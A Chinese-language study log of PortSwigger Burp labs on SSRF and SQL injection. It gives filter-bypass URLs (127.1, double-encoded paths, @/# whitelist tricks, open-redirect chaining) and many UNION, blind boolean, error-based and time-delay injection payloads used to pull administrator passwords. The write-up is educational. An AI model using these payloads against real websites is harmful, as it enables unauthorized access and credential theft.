ssrf形成原因大都是由于服务端提供了从其他服务器应用获取数据的功能但是没有对目标地址进行过滤和限制

### 利用方式

* 扫描内部网络，获取端口，服务信息
* 攻击运行在内网或本地的应用
* 对内网web进行指纹识别（相当于收集web服务的信息）
* 对内部主机和端口发送请求包进行攻击
* file协议读取本地文件

### 常见的防御措施

基于黑名单的过滤，对包含主机名的**127.0.0.1**或**localhost**或敏感url，如**/admin**会被绕过**​**如何绕过：**​****127.0.0.1****​**可以用**127.1**来绕过，** /admin**可以用url编码来绕过，例如a通过两次url编码会变成  **%2561**

### burp实验

#### 实验：针对本地服务器的基本 SSRF

这个网站模拟了一个购物网站，因为是ssrf，所以感觉要找的是由服务器端发送的请求，在网站中找到一个查询库存的选项，找到这个请求体中有一个api，所以服务器端会向这个url发送请求，得到库存在返回给客户端

![](https://pic.imgdb.cn/item/6723627fd29ded1a8c50a4da.png)

所以要修改的话就是要修改这个api

根据提示，修改为`https://localhost/admin`得到了管理员的页面，因为这个localhost是由服务器端发送的，所以被认为有管理员权限，我们在响应就可以看到这个页面，然后找到删除用户的url就是`http://localhost/admin/delete?username=carlos`，再将url修改为这个，就成功了

#### 实验：针对另一个后端系统的基本 SSRF

这个实验同样是在检查库存时服务器端会发送请求到对应api，然后这里给的是`192.168.0.1：8080`这是c类地址，所以要找最后一个字节的主机地址是什么找到可以登录管理员

对ip进行攻击，发现在59这里可以访问/admin页面，修改api后发送请求，之后就和上面一样（吐槽：burp不知道出什么问题了，有一个发送请求一直无法访问，copy到另一个页面就能访问了）

#### 实验：基于黑名单的输入过滤器的 SSRF

发现被绕过了，127.0.0.1/admin无法访问

尝试访问127.1，可以访问，以为她会自动补充两个缺失的值，还可以用ip地址的十进制来访问
例如127.0.0.1就可以用这个**2130706433**

[IP地址十六进制、二进制、十进制转换-ME2在线工具](https://www.metools.info/other/ipconvert162.html)

最后用访问到管理员界面，然后删除用户

```
https://127.1/%2561dmin
```

#### 实验：基于白名单的输入过滤器的 SSRF

##### 绕过白名单的方法

1.使用URL凭证部分绕过

* 技术：在URL中，可以通过@符号在主机名前加入凭证信息

```
https://expected-host:fakepassword@evil-host
```

按照url标准解析的话，`fakepassword`是凭证，实际访问的是`evil-host`
如果白名单只验证url中开头的部分，就会因为`expected-host`存在而误判，放行
但是后端真正访问的是`evil-host`

2.利用URL片段

* 技术：通过`#`符号指定片段，使实际主机在片段前，而片段包含白名单匹配的内容

```
https://evil-host#expected-host
```

实际访问的主机是`evil-host`，#后被视为片段，不参与HTTP请求，但是有些网站白名单可能只看到`expected-host`，被绕过了

3.利用DNS命名层级

* 技术：在攻击者控制的域名下套白名单关键字，使URL符合验证规则

```
https://expected-host.evil-host
```

主机名是`expected-host.evil-host`，但后缀`.evil-host`是攻击者的域
如果白名单只检查开头，则会被绕过

4.URL编码混淆

* 技术：对URL的关键部分解析编码或双重编码，来混淆

以上几种方法可以混合使用

因为这个网站有输入的白名单，所以不能用ip来绕过

解决方案中使用了这个url，这里@符号后的是主机部分，用来绕过白名单

```
http://username@stock.weliketoshop.net/
```

所以这时候再加上#号

```
http://localhost#@stock.weliketoshop.net/admin/delete?username=carlos
```

再对#号双重编码，所以

```
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

这里的网站先系解析了@后被解析为主机名，从而绕过了检查，所以网站会将访问的url是

```
http://localhost/admin/delete?username=carlos
```

#### 实验：通过开放重定向漏洞绕过过滤器的 SSRF

这个题目的意思应该是http请求的api支持重定向，在访问一个url后指向url中的另一个url地址

一开始还是和之前一样试，但是发现不行，看视频发现下面还有一个另一个页面

![](https://pic.imgdb.cn/item/673afd8dd29ded1a8c75ce7d.png)

点击之后发现一个GET请求

![](https://pic.imgdb.cn/item/673afdb5d29ded1a8c75f69c.png)

发现请求的参数中有一个path，可以修改这个参数

然后将get的这个请求修改，发现请求不了admin，因为这个不是由服务器发送的请求
所以将这一段修改为api的参数，并进行url编码

```
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```

成功进入

## SQL

SQL是一种针对数据库的漏洞，攻击者会利用这个漏洞干扰应用对数据库的查询，获取本来无法获取的数据，甚至可以修改或删除这些数据

大部分的SQL注入发生在`WHERE`中的`SELECT`，SQL注入可能发生在查询中的任何位置，一些常见位置有

* 在`UPDATE`语句中，在更新的值或`WHERE`子句中
* 在`INSERT`语句中，在插入的值内
* 在`SELECT`语句中，在表或列名内
* 在`SELECT`语句中，子句内`ORDER BY`

### SQL注入示例

#### 检索隐藏数据

在一个网站查询一个类别的产品时，网站可能会请求

```
https://insecure-website.com/products?category=Gifts
```

应用就会执行SQL查询，在数据库中寻找对应的信息

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

* `*` 表示所有信息
* 在 products 中查询 category属性是Gifts的物品
* 并且 released 为 1 的所有产品

最后的released可能是为了隐藏未发布的产品

使用注入

```url
https://insecure-website.com/products?category=Gifts'--
```

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

这里注入的原理是 `-- `在sql中是注释符，意味着剩余的语句被解释为注释，所以查询中不再包含 released = 1 这个限制，会将所有产品查询

如果更进一步，要查询不知道类别的数据

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

这个在后面多加了一个 `1=1`，以为1=1始终成立，所以所有项目都会被输出

#### 颠覆应用程序逻辑

如果一个应用允许用户使用用户名和密码进行登录，提交的用户名和密码应该要在数据库中查询

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

如果查询返回用户的详细信息，则登录成功

如果没有sql注入的防护，那么只要在用户名中输入 `marin'--`，密码无论输入什么都可以登录marin用户，并进行攻击

```sql
SELECT * FROM users WHERE username = 'marin'--' AND password = ''
```

#### 从其他数据库检索数据

可以使用关键字`UNION`附加`SELENT`查询并将结果加到原来的查询中

```sql
SELECT name FROM products WHERE category = 'Gifts'
```

如果我提交的是

```sqlite
SELECT name FROM products WHERE category = 'Gifts' UNION SELECT     username , password FROM users--
```

`UNION`用来合并两个查询的结果，这个将会返回类别为空的产品和users表中的名字和密码

```sqlite
'UNION SELECT password || '-' || username FROM users
```

如果返回的列数不够，可以使用这个语句将列合成一列输出

要执行UNION攻击有两个要求

* 原始查询返回了多少列
* 从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果

#### 盲SQL注入

如果应用防御了sql注入，攻击者无法直接获取到注入后获得的信息，所以被称为盲注

盲注有两种形式

* 布尔盲注：攻击者通过注入语句，利用应用中基于布尔条件的判断来获取有关数据库内容的信息
* 时间盲注：攻击者在注入语句中使用延时函数或计算处理时间，用来观察应用对恶意查询的处理时间，观察时间的变化来推断数据

### SQL注入语句

https://portswigger.net/web-security/sql-injection/cheat-sheet

#### 查询数据库版本

在sql中，可以用以下语句查询数据库的版本

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`SELECT @@version`|
|**Oracle**|`SELECT * FROM v$version`<br />`SELECT version FROM v$instance`|
|**PostgreSQL**|`SELECT version()`|
|**MySQL**|`SELECT @@version`|

字符串连接

|数据库类型|语句|
| ----------| ------|
|**Microsoft SQL Server**|`'foo' + 'bar'`|
|**Oracle**|`'foo'|
|**PostgreSQL**|`'foo'|
|**MySQL**|`'foo'  'bar'`<br />`CONCAT('foo', 'bar')`|

#### 提取子字符串

下面的都会返回`in`
查询参数：字符串，起始位置，长度（起始位置是从1开始的）

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`SUBSTRING('marin', 4, 2)`|
|**Oracle**|`SUBSTR('marin', 4, 2)`|
|**PostgreSQL**|`SUBSTRING('marin', 4, 2)`|
|**MySQL**|`SUBSTRING('marin', 4, 2)`|

#### 注释

通常用来结尾，多行注释统一为`/* comment */`

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`-- comment`|
|**Oracle**|`-- comment`|
|**PostgreSQL**|`-- comment`|
|**MySQL**|`# comment`<br />`-- comment`|

#### 查询表和列信息

列出所有表

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`SELECT * FROM information_schema.tables;`|
|**Oracle**|`SELECT * FROM all_tables;`|
|**PostgreSQL**|`SELECT * FROM information_schema.tables;`|
|**MySQL**|`SELECT * FROM information_schema.tables;`|

列出某个表的列，同具体表名替换`TABLE-NAME-HERE`

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';`|
|**Oracle**|`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE';`|
|**PostgreSQL**|`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';`|
|**MySQL**|`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE';`|

#### 布尔操作

`YOUR-CONDITION-HERE`是需要判断的条件

|数据库类型|语句|
| ----------| ----|
|**Microsoft SQL Server**|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END;`|
|**Oracle**|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;`|
|**PostgreSQL**|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END);`|
|**MySQL**|`SELECT IF(YOUR-CONDITION-HERE, (SELECT table_name FROM information_schema.tables), 'a');`|

### burp实验

#### 实验：WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据

只要在请求中加上这段，就能查询所有数据

```
/filter?category=Gifts'+OR+1=1--
```

#### 实验：允许绕过登录的 SQL 注入漏洞

用户名使用`administrator'--`，就可以登入

#### 实验：通过 XML 编码绕过过滤器的 SQL 注入

因为要获取到管理员的username和password，所以需要寻找可以注入的地方，在查询物品库存的地方可以注入sql，但是有个waf导致无法注入，使用拓展hex_entities 成功绕过

![](https://pic.imgdb.cn/item/67444b7c88c538a9b5bba6cd.png)

这里的

```sqlite
1 UNION SELECT username || '-' || password FROM users
```

其中的逻辑就是UNION需要前后的列数是匹配的，这里的1列数只有1列，所以直接查username和password是没有返回的，用`||`将两个字符串连接起来，这样结果就只会返回一列

最后成功获得数据

#### 实验：SQL 查询 Oracle 上的数据库类型和版本

我自己尝试的注入没成功，查看他给的

使用这个查看是否可以返回两列数据

```sqlite
'+UNION+SELECT+'abc','def'+FROM+dual--
```

![](https://pic.imgdb.cn/item/67444e9888c538a9b5bba7a2.png)

```sqlite
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

这里的BANNER是v$version中的一列，包含数据库版本信息，加NULL是因为这里需要返回两行数据

![](https://pic.imgdb.cn/item/67444f0888c538a9b5bba7e2.png)

#### 实验：查询 MySQL 和 Microsoft 的数据库类型和版本

这里同样也是先查询几列

```sqlite
'+UNION+SELECT+'abc','def'#
```

这里--无法使用，那就用#

确定是两列就可以查看数据了

```sqlite
'+UNION+SELECT+@@version,+NULL#
```

#### 实验：列出非 Oracle 数据库上的数据库内容

先查列数，是一样的

用这个查找所有的表

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

![](https://pic.imgdb.cn/item/67445a5188c538a9b5bba9f2.png)

找到这其中有users的表，然后我们就可以查找数据了

```sqlite
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_nwmlhk'--
```

成功获取数据

```sqlite
'+UNION+SELECT+password_kturkk,+username_pwazrb+FROM+users_nwmlhk--
```

#### 实验：列出 Oracle 上的数据库内容

获取所有表名

```sqlite
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

获取表中列的详细信息

```sqlite
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_JHSOTO'--
```

获取数据

```sqlite
'+UNION+SELECT+USERNAME_VZAVSA,PASSWORD_BKEBCS+FROM+USERS_JHSOTO--
```

#### 实验：UNION 攻击，确定查询返回的列数

使用UNION确定返回几列数据

一直加NULL直到页面有响应

```sqlite
'UNION+SELECT+NULL,NULL,NULL--
```

#### 实验：UNION 攻击，查找包含文本的列

先查找返回的列数

然后将字符串插入其中

```sqlite
'UNION+SELECT+NULL,'dyaaqQ',NULL--
```

#### 实验室：UNION 攻击，检索单个列中的多个值

```sqlite
'UNION+SELECT+NULL,username||+'-'+||password+FROM+users--
```

#### 实验：使用条件响应进行盲 SQL 注入

这个题目要求使用提交cookie的值来进行sql盲注

发现cookie有一个`TrackingId`cookie 的请求，当这个请求正确时，会在页面上显示`welcome back`，通过这个来判断输入是否正确

```sqlite
TrackingId='KWpIaXfvVvktP2NS'and 1=1--
```

判断这个是否能进行sql查询，发现可以之后进行sql注入

```sqlite
TrackingId='KWpIaXfvVvktP2NS' and (SELECT 'x' FROM users LIMIT 1) = 'x'--
```

查询有没有users表

```sqlite
TrackingId='KWpIaXfvVvktP2NS' and (SELECT username FROM users WHERE username='administrator' ) = 'administrator'--
```

查询表中是否存在administrator这个列

```sqlite
TrackingId='KWpIaXfvVvktP2NS' and (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1 )='administrator'--
```

查询密码字符串的长度，一直尝试最后查询到秘密长度是20

```sqlite
TrackingId='KWpIaXfvVvktP2NS' and (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
```

* substring(string,start_position,length)

用注入查询密码的字符串

使用intruder进行爆破

使用两个payload，一个是位置，一个是对应字符

![](https://pic.imgdb.cn/item/674a9f3fd0e0a243d4db5f24.png)

![](https://pic.imgdb.cn/item/674a9f14d0e0a243d4db5f1a.png)

最后用筛选器筛选出有welcome的响应，最后排序获得密码

![](https://pic.imgdb.cn/item/674a9e97d0e0a243d4db5f07.png)

#### 实验：带有条件错误的盲 SQL 注入

这个实验的数据库是Oracle，以为这个网站没有上一题那样有特征，但是这个网站会报错，在输入的sql有问题时网页会报错，依靠这个来进行注入

```sql
TrackingId=SLfBtZlwJyQshwRg'
```

最开始的时候这个是会报错的

```sql
TrackingId=SLfBtZlwJyQshwRg''
```

封装上''号才行，数据库会把这个识别会一个合法的空字符串

```sql
TrackingId=SLfBtZlwJyQshwRg'||(SELECT '' FROM dual)||'
```

这个后面的查询后加入到这个字符串中，验证了可以进行sql查询

```sqlite
TrackingId=SLfBtZlwJyQshwRg'||(SELECT '' FROM users WHERE rownum = 1)||'
```

查询是否存在users表，后面的rownum确保返回一行，不影响输出

```sqlite
TrackingId=SLfBtZlwJyQshwRg'||(SELECT '' FROM users WHERE username = 'administrator')||'
```

判断有无administrator这个字段，没有的话网页会报错

```sqlite
TrackingId=SLfBtZlwJyQshwRg'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>10 )||'
```

这里的注入是在判断密码长度，在FROM后面的内容为真时，才会执行前面的CASE情况，因为前面1始终等于1，所以如果执行了这个语句，就会有1/0导致网页报错，所以如果网页正常响应，证明后面的不成立，根据这个来判断密码长度

```sqlite
TrackingId=SLfBtZlwJyQshwRg'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND substr(password,§1§,1)='§a§' )||'
```

最后使用这个来爆破密码的字符串

#### 实验：基于错误的可见 SQL 注入

这个网站会将错误的详情打印出来，这个就很好发现错误

```sql
TrackingId=YvhiiGg79fKrPqN1'AND CAST((SELECT 1)as INT)--
```

这里后面的CAST是一个类型转换函数，会将这个转换为整形，查看页面返回的错误，页面需要这个后面的类型是布尔类型

```sql
TrackingId=YvhiiGg79fKrPqN1'AND 1 = CAST((SELECT 1)as INT)--
```

加个1 = 就行

```sql
TrackingId='AND 1 = CAST((SELECT username FROM users LIMIT 1 )as INT)--
```

这里一开始注入的时候发现报错，截断了我的语句，所以可能是后台有什么限制，所以把前面没什么用的给删了，后面继续发现报错直接把用户名给出来了

```
ERROR: invalid input syntax for type integer: "administrator"
```

所以直接利用这个找到密码

#### 实验：具有时间延迟的盲 SQL 注入

要求是造成10秒的延迟

```sqlite
TrackingId=FdyvhImcsSHIz3LT'||pg_sleep(10)--
```

#### 实验：具有时间延迟和信息检索的盲 SQL 注入

利用时间延迟来查询密码

```sql
TrackingId=0OMaZLwZ5zwL3ZDM'|| (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

如果有这个名字就会延迟10秒，同样的逻辑查看密码长度

```sql
TrackingId=0OMaZLwZ5zwL3ZDM'|| (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

最后看密码字符串

```sql
TrackingId=0OMaZLwZ5zwL3ZDM'|| (SELECT CASE WHEN (username = 'administrator' AND substring(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

爆破检查超过10秒的响应

记录一个使用小技巧

将超过10秒的高亮，然后仅显示高亮，再按payload排序

![](https://pic.imgdb.cn/item/674ad7fad0e0a243d4db700a.png)
